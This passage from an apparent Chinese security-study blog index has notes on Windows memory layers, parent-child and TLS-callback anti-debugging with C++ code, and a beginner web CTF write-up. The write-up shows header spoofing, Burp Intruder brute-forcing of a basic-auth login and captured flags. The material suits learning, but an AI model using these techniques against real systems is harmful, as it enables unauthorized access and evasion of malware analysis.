alt="win内存管理层级"></p><p>可以看出，层级是c运行时函数/本地全局内存API高于堆内存API高于虚拟内存API高于内核，内存映射文件API和VirtualMemoryAPI是一层的。</p><p>所以说，C语言中使用的malloc/calloc和cpp中的new底层调用的都是HeapAlloc函数，HeapAlloc函数底层调用的都是VirtualAlloc函数，VirtualAlloc函数和MemoryMappedFile都调用的是内核的函数。</p><p>那为什么不直接使用VirtualAlloc函数呢，因为它有着限制，每次必须分配页大小的倍数的内存，内存地址也要对齐等满足系统底层效率的要求(VirtualAlloc申请的内存就是实际上的页交换文件)，在写上层代码的时候我们往往不想考虑这么多，因此就封装成高层函数了。</p><hr><p>参考：</p><p>书籍：深入理解计算机系统</p><p>网站：</p><p><a href="https://www.bilibili.com/read/cv16655753/">一篇文带你搞懂，虚拟内存、内存分页、分段、段页式内存管理（超详细）</a></p><p><a href="https://www.bilibili.com/video/BV1AU411o7GY/">你真的理解虚拟内存吗</a></p><p><a href="https://blog.csdn.net/weixin_65286359/article/details/135577694">CPU入门扫盲篇之MMU内存管理单元------万字长文带你搞定MMU&amp;TLB&amp;TWU</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> Win核心 </category>
          
          <category> Win内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内存 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>父子进程反调试</title>
      <link href="/posts/3f67770.html"/>
      <url>/posts/3f67770.html</url>
      
        <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>顾名思义，如果一个进程创建出了另一个进程</p><p>然后用第一个进程（父）去调试第二个进程（子）</p><p>子进程由于已经被调试，所以不能再被调试器附加，从而防止了真实逻辑被调试</p><p>这里引申出几个议题：</p><blockquote><p>如何创建另一个进程（子进程的来源）</p><ul><li>另一个可执行程序</li><li>就是本身</li><li>一段内存中的代码</li></ul><p>从上又分出几个问题</p><ul><li>创建另一个可执行程序（已经存在的，还是在代码里面需要dump或者从网上下载）</li><li>本身（如何区分两次执行的逻辑流）</li><li>一段内存中的代码（CreateProcess很明显不支持，那要怎么办）</li></ul></blockquote><p>第二：</p><blockquote><p>如何用父进程调试子进程</p><p>在win API中有CreateProcess的第6个参数可以选择父进程作为调试器。</p><p>然后通过API中其它函数来接受调试信息以及读取/修改子进程的上下文/寄存器/执行流。</p><p>有没有其它办法不知道</p></blockquote><p>第三：</p><blockquote><p>执行完如何返回内容/结果</p><p>同样在win API中有函数OutputDebugString来输出调试信息</p></blockquote><p>现在以创建自身为新进程来解释</p><hr><h2 id="区分逻辑流的方法">区分逻辑流的方法</h2><p>区分逻辑流，表明为需要一个if-else分支语句来执行不同的代码</p><p>因此</p><ul><li>if中写一样的内容，但是可能返回不同的东西</li><li>在执行第一个逻辑时修改了本身，导致执行流的改变</li></ul><p>对于第一种情况</p><ul><li>检查自身的状态，两次的状态不一致</li><li>检查外界的状态，通过本身在外界的注册内容来判断</li></ul><p>常见标志位<br>系统函数</p><p>这些内容还没怎么学QAQ</p><p>我只知道绑定端口和创建互斥体两个函数，这两个函数只要指定了id，只要第一次返回可行，第二次一定失败。借这个来直接区分逻辑流，至于使用它们，自然不重要</p><p>还有就是创建进程时可以指定参数，参数数量也可以算作不同的内容</p><hr><h2 id="调试方法">调试方法</h2><p>首先CreateProcess，并设置DEBUG_PROCESS</p><p>然后WaitForDebugEvent等待并读取调试信息</p><p>然后用得到的debugEvent.dwDebugEventCode来判断类型</p><p>比如：EXCEPTION_DEBUG_EVENT（int 3断点）</p><p>然后就可以用WriteProcessMemory写入内存，其它的像获取rip，stack之类的就不说了</p><p>最后ContinueDebugEvent继续执行流程</p><p>这里只是大概说个流程</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 技能 </category>
          
          <category> 反动态调试 </category>
          
          <category> 双进程调试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 反调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TLS相关研究</title>
      <link href="/posts/95e9e72b.html"/>
      <url>/posts/95e9e72b.html</url>
      
        <content type="html"><![CDATA[<p>经常能看到有tls的题，这里研究一下tls的原理和写法</p><p>然后就发现网上已经有很全的教程了，那我就直接放教程了</p><p><a href="https://www.52pojie.cn/thread-1490663-1-1.html">【原创】反调试实战系列二 TLS反调试+CheckRemoteDebuggerPresent原理 - 『软件调试区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p><h3 id="写法">写法</h3><p>这个说的很清楚，要写TLS函数，只需要：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//包含回调</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64       <span class="comment">//64位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_used&quot;</span>)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span>               <span class="comment">//32位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>) </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">//创建段</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line">EXTERN_C <span class="type">const</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="comment">//是c语言就不写</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//前缀表示这是线程的全局变量，每个线程初始化的值都是0x1，生命仅在这个线程内</span></span><br><span class="line">__declspec (thread) <span class="type">int</span> CheckIsChildren = <span class="number">0x1</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//函数定义</span></span><br><span class="line"><span class="function"><span class="type">void</span> NTAPI <span class="title">t_TlsCallBack</span><span class="params">(PVOID Dllhandle, DWORD Reason, PVOID Reserved)</span></span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加函数到数组，执行时按数组元素依次执行</span></span><br><span class="line">PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; t_TlsCallBack ,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>然后就是：</p><h3 id="reason">reason</h3><p>Reason值对应4种调用原因，在这四个条件下，都会触发TLS回调函数</p><table><thead><tr><th style="text-align:left">宏定义</th><th style="text-align:left">值</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">DLL_PROCESS_ATTACH</td><td style="text-align:left">1</td><td style="text-align:left">一个新进程已经启动，包括第一个线程</td></tr><tr><td style="text-align:left">DLL_THREAD_ATTACH</td><td style="text-align:left">2</td><td style="text-align:left">创建了一个新线程。此通知已发送给除第一个线程外的所有线程</td></tr><tr><td style="text-align:left">DLL_THREAD_DETACH</td><td style="text-align:left">3</td><td style="text-align:left">线程即将被终止。此通知已发送给除第一个线程外的所有线程</td></tr><tr><td style="text-align:left">DLL_PROCESS_DETACH</td><td style="text-align:left">0</td><td style="text-align:left">进程即将终止，包括原始线程</td></tr></tbody></table><p>所以内部应当使用if来判断（或者没有创建线程，就不管了）</p><h3 id="提示">提示</h3><ul><li>在使用CreateThread后记得WaitForSingleObject防止主线程提前结束</li><li>tls声明的变量是在每个线程里面分离的，互不影响，类似于静态局部变量？？</li></ul><hr><p>相关代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//包含回调</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64       <span class="comment">//64位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_used&quot;</span>)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span>               <span class="comment">//32位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>) </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">//创建段</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line">EXTERN_C <span class="type">const</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">__declspec (thread) <span class="type">int</span> CheckIsChildren = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* szMsg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hStdout = <span class="built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);</span><br><span class="line"><span class="built_in">WriteConsoleA</span>(hStdout, szMsg, <span class="built_in">strlen</span>(szMsg), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> NTAPI <span class="title">t_TlsCallBack</span><span class="params">(PVOID Dllhandle, DWORD Reason, PVOID Reserved)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (Reason == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">CheckIsChildren--;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;loaded\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Reason == <span class="number">2</span>) &#123;</span><br><span class="line">CheckIsChildren += <span class="number">7</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;this is %d\n&quot;</span>, CheckIsChildren);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Reason == <span class="number">3</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;exit thread %d\n&quot;</span>, CheckIsChildren);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Reason == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="type">char</span> szMsg[<span class="number">80</span>] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line"><span class="built_in">wsprintfA</span>(szMsg, <span class="string">&quot;%d&quot;</span>, CheckIsChildren);</span><br><span class="line"><span class="built_in">print</span>(szMsg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; t_TlsCallBack ,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">MyThreadFunction</span><span class="params">(LPVOID lpParam)</span> </span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Thread running with value: &quot;</span> &lt;&lt; CheckIsChildren &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;why dont play\n&quot;</span>;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (CheckIsChildren == <span class="number">0</span>) &#123;</span><br><span class="line">CheckIsChildren += <span class="number">2</span>;</span><br><span class="line">std::cout &lt;&lt; CheckIsChildren &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">PROCESS_INFORMATION ProInfo;</span><br><span class="line">STARTUPINFO StartInfo;</span><br><span class="line"><span class="built_in">ZeroMemory</span>(&amp;StartInfo, <span class="built_in">sizeof</span>(StartInfo));</span><br><span class="line">TCHAR ModulePath[<span class="number">100</span>] = &#123;&#125;;</span><br><span class="line"><span class="built_in">GetModuleFileName</span>(<span class="literal">NULL</span>, ModulePath, <span class="number">100</span>);</span><br><span class="line"><span class="type">int</span> input = <span class="number">1</span>;</span><br><span class="line"><span class="comment">/*CreateProcess(NULL,</span></span><br><span class="line"><span class="comment">ModulePath,</span></span><br><span class="line"><span class="comment">NULL,</span></span><br><span class="line"><span class="comment">NULL,</span></span><br><span class="line"><span class="comment">TRUE,</span></span><br><span class="line"><span class="comment">DEBUG_PROCESS,</span></span><br><span class="line"><span class="comment">NULL,</span></span><br><span class="line"><span class="comment">NULL,</span></span><br><span class="line"><span class="comment">&amp;StartInfo,</span></span><br><span class="line"><span class="comment">&amp;ProInfo);</span></span><br><span class="line"><span class="comment">WaitForSingleObject(ProInfo.hProcess, INFINITE);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CloseHandle(ProInfo.hProcess);</span></span><br><span class="line"><span class="comment">CloseHandle(ProInfo.hThread);</span></span><br><span class="line"><span class="comment">printf(&quot;\nfinished\n&quot;);*/</span></span><br><span class="line">DWORD threadId;</span><br><span class="line">HANDLE hThread = <span class="built_in">CreateThread</span>(</span><br><span class="line"><span class="literal">NULL</span>,                   <span class="comment">// 默认安全属性</span></span><br><span class="line"><span class="number">0</span>,                      <span class="comment">// 默认堆栈大小</span></span><br><span class="line">MyThreadFunction,       <span class="comment">// 线程函数</span></span><br><span class="line">&amp;input,                 <span class="comment">// 传递给线程函数的参数</span></span><br><span class="line"><span class="number">0</span>,                      <span class="comment">// 默认创建标志</span></span><br><span class="line">&amp;threadId               <span class="comment">// 返回线程ID</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//Sleep(1000);</span></span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;NO!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;yes,yes,yes&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，如果vs中需要生成Release版本，会导致TLS失效，可以从属性-C/C+±优化中把全程序优化关掉</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 技能 </category>
          
          <category> 综合保护 </category>
          
          <category> TLS线程回调 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门</title>
      <link href="/posts/f3edc96d.html"/>
      <url>/posts/f3edc96d.html</url>
      
        <content type="html"><![CDATA[<h3 id="开发者工具打开方式">开发者工具打开方式</h3><ul><li>F12/command option I<br>ctrl shift I</li><li>右上角更多，开发人员工具</li><li>右键页面，检查</li></ul><h3 id="Burpsuit使用场景">Burpsuit使用场景</h3><h4 id="抓包">抓包</h4><p>在服务器和客户端之间放一个中间人，两边只和中间人相联系，通过中间人，我们可以看到两边交互的数据以及修改它们</p><h4 id="重放">重放</h4><p>发送到重放，我们可以修改内容然后再发送</p><h4 id="爆破">爆破</h4><p>发送到爆破，遍历一些内容并发送，实现爆破攻击得到想要的东西</p><h4 id="编码解码">编码解码</h4><p>得到的响应包可能是编码后的内容，使用解码来查看生字符，或者把信息编码后发送</p><h3 id="http">http</h3><p>客户端/服务端：前者是请求内容的，后者是计算并提供内容的</p><p>请求包/相应包：客户端发给服务端的包，服务端响应客户端返回的包</p><h4 id="请求包-相应包格式">请求包/相应包格式</h4><h5 id="请求行">请求行</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /?wllm=<span class="number">2</span>%<span class="number">27</span>% HTTP/<span class="number">1</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>字段</th><th>作用</th></tr></thead><tbody><tr><td>请求方法</td><td>说明是get还是post</td></tr><tr><td>URL字段</td><td>如果是get就会有get内容的具体说明</td></tr><tr><td>HTTP版本协议</td><td>1.1或1.0</td></tr></tbody></table><h5 id="请求头">请求头</h5><p><a href="https://blog.csdn.net/qq_42684504/article/details/106634035">HTTP 请求头各参数具体含义_请求头的参数详解-CSDN博客</a></p><h5 id="空行">空行</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>用于分隔请求头和数据</p><h5 id="请求数据">请求数据</h5><p>如果是GET，则为空行，如果是POST，则是xxx=xxx&amp;xxx=xxx形式的变量及值</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">params<span class="operator">=</span>BbITMWZukVrbpcvF<span class="number">9E9</span>subK<span class="number">2</span><span class="keyword">c</span><span class="number">4</span>G<span class="number">5</span>qLX<span class="number">0</span>zQfWyh<span class="number">3</span>TukD<span class="number">43</span>kI<span class="variable">%2</span>BdaOFlA<span class="number">9</span>rOJTasxuH<span class="number">9</span>cRGzv<span class="number">8</span>A<span class="variable">%2</span>BTuJIi<span class="variable">%2</span>Fq<span class="number">6</span>QDciuadCEJ<span class="number">1</span>ppF<span class="number">6</span>eP<span class="number">8</span>k<span class="number">2</span>wR<span class="variable">%2</span>FkQiZnohRO&amp;encSecKey<span class="operator">=</span>decd<span class="number">4703</span>eddd<span class="number">42253</span>cb<span class="number">59259</span><span class="keyword">c</span><span class="number">60</span>f<span class="number">689869</span>cb<span class="number">6</span>df<span class="number">59</span>b<span class="number">7</span>ab<span class="number">906917</span>f<span class="number">23</span>b<span class="number">76</span>eb<span class="number">2</span>d<span class="number">5393</span>b<span class="number">40e1</span>bbd<span class="number">0</span>b<span class="number">697700288149</span>d<span class="number">4</span>ca<span class="number">398</span>a<span class="number">8</span><span class="keyword">c</span><span class="number">20</span>f<span class="number">000</span><span class="keyword">cc</span><span class="number">3</span>f<span class="number">47452984</span>d<span class="number">6665</span><span class="keyword">c</span><span class="number">5183</span><span class="keyword">c</span><span class="number">1330729</span>fed<span class="number">3</span>d<span class="number">63e4011495</span>f<span class="number">3</span>cee<span class="number">6</span>ff<span class="number">4e29</span>d</span><br></pre></td></tr></table></figure><h4 id="响应码">响应码</h4><p><a href="https://www.runoob.com/http/http-status-codes.html">HTTP 状态码 | 菜鸟教程 (runoob.com)</a></p><h4 id="robot-txt">robot.txt</h4><p>如果网站根目录有这个文件，合法的爬虫爬取时就会依照这个文件的要求去(不)爬取相应的文件</p><p>格式：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-agent</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Allow</span><span class="punctuation">: </span>/</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-agent</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Disallow</span><span class="punctuation">: </span>/</span><br></pre></td></tr></table></figure><p>User-agent用于表明自己的身份或区分用途</p><p>比如：Googlebot，Googlebot-Image，Storebot-Google，Bingbot等</p><p>Disallow用于写入不允许访问的目录或文件，似乎支持正则表达式</p><p>Allow用于只能访问对应的目录或文件，似乎支持正则表达式。比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Disallow: /blog Allow: /blog/allowed-post</span><br></pre></td></tr></table></figure><p>只允许访问allowed-post，而同目录下其它的不能访问</p><h2 id="WP">WP</h2><h3 id="gift-F12">gift_F12</h3><p>根据提示，f12打开开发者模式，找到源码，发现flag：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">WLLMCTF</span><span class="template-variable">&#123;We1c0me_t0_WLLMCTF_Th1s_1s_th3_G1ft&#125;</span></span><br></pre></td></tr></table></figure><h3 id="get-post">get_post</h3><p>发送get和post请求即可</p><h3 id="Do-you-know-HTTP">Do you know HTTP</h3><p>根据要求修改请求头</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">HS</span> / HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: node5.anna.nssctf.cn:<span class="number">22621</span></span><br><span class="line"><span class="attribute">Gecko</span>/<span class="number">20100101</span> Firefox/<span class="number">115</span>.<span class="number">0</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/jxl,image/webp,*/*;q=<span class="number">0</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">8</span>,zh-TW;q=<span class="number">0</span>.<span class="number">7</span>,zh-HK;q=<span class="number">0</span>.<span class="number">5</span>,en-US;q=<span class="number">0</span>.<span class="number">3</span>,en;q=<span class="number">0</span>.<span class="number">2</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">X</span>-Forwarded-For: <span class="number">127.0.0.1</span></span><br><span class="line"><span class="attribute">Referer</span>: www.ltyyds.com</span><br><span class="line"><span class="attribute">User</span>-Agent: LT</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一开始被坑了，在最后放了一个User-Agent: LT不知道为什么出不来，结果发现在上面还有一个User-Agent，删了就出了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">NSSCTF</span>&#123;e6688e51-abc6-<span class="number">4943</span>-b819-<span class="number">3</span>e4d967c9457&#125;</span><br></pre></td></tr></table></figure><h3 id="robots">robots</h3><p>不知道为什么场景启动不了</p><p>没写</p><h3 id="ctfhub-web前置-http">ctfhub-web前置-http</h3><h4 id="请求方式">请求方式</h4><p>直接修改请求方式为CTFHUB</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ctfhub</span>&#123;<span class="number">0</span>a211e2f0ed998f0bb25c674&#125; </span><br></pre></td></tr></table></figure><h4 id="302跳转">302跳转</h4><p>好怪，跟着wp做出来了</p><p>但是还是不理解为什么重放（重放有自动拦截功能，可以点击跟随重定向得到重定向后的内容）一遍就好了，发送的包都是一样的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ctfhub</span>&#123;<span class="number">1</span>b0aee8a83c3e0d0322ce749&#125;</span><br></pre></td></tr></table></figure><h4 id="Cookie">Cookie</h4><p>在请求头中把admin改成1</p><h4 id="基础认证">基础认证</h4><p>先抓包，发现一串base64，解码后发现是用户名:密码</p><p>好像给了一些能爆破的密码，但是不知道用户名，先猜一个admin</p><p>然后在intruder里面</p><p><img src="https://s2.loli.net/2024/07/26/wyDjHabJuh783ek.png" alt="image-20240726164807767"></p><p>这样开始爆破</p><p>没出来，难受。去网上看wp，它们说要把下面的payloadURL编码去掉，然后就对了，不理解</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">YWRtaW46bXVzdGFuZw</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line">ctfhub&#123;<span class="number">6</span>fd9a3602ed44a12e16ba9eb&#125;</span><br></pre></td></tr></table></figure><h4 id="相应包源代码">相应包源代码</h4><p>点击按钮，没用拦到信息，所以应该是发了一个代码过来</p><p>f12看源代码</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;<span class="number">669</span><span class="keyword">c</span><span class="number">2</span>d<span class="number">83e81</span><span class="keyword">c</span><span class="number">22</span><span class="keyword">c</span><span class="number">497</span>bece<span class="number">5</span>b&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
